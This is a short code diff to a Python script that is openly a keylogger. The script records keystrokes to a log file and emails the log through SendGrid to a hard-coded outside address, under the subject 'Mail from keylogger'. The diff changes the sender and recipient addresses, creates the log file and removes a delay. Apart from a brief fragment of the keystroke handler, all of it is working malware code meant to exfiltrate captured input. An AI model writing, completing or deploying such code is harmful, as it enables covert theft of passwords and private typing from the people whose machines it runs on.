@@ -10,7 +10,7 @@ from sendgrid.helpers.mail import Mail
 
 from dotenv import load_dotenv
 load_dotenv()
-
+open('key_log.txt','a').close()
 def send_mail():
     li = []
     to_mail = ['']
@@ -29,8 +29,8 @@ def send_mail():
 
     main = '\n'.join(li)
     message = Mail(
-        from_email='jidnyesh_keylogger@gmail.com',
-        to_emails=to_mail,
+        from_email='rishabh@gmail.com',
+        to_emails='jidnyeshaj@gmail.com',
         subject='Mail from keylogger',
         html_content=main)
 
@@ -42,7 +42,7 @@ def send_mail():
 
 send_mail()
 os.remove('key_log.txt')
-time.sleep(5)
+
 logging.basicConfig(filename=("key_log.txt"), level=logging.DEBUG, format='%(message)s')
 
 def on_press(key):
